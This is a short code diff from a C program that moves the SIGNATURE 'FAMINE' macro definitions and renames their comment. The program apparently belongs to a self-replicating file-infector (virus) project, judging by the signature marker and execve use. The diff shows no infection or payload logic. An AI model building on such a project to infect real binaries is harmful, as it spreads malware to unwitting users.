@@ -14,16 +14,16 @@
 #include <sys/wait.h> // waitpid
 #include <unistd.h>   // execve
 
+/* Macros */
+#define SIGNATURE "FAMINE"
+#define SIGNATURE_SIZE (sizeof(SIGNATURE) - 1)
+
 #ifdef VERBOSE
 # include <stdio.h> // stderr, fprintf()
 # define LOG(...) fprintf(stderr, __VA_ARGS__)
 #else
 # define LOG(...) ((void)0)
 #endif
-
-/* Defines */
-#define SIGNATURE "FAMINE"
-#define SIGNATURE_SIZE (sizeof(SIGNATURE) - 1)
 
 /* External var */
 extern char** environ;
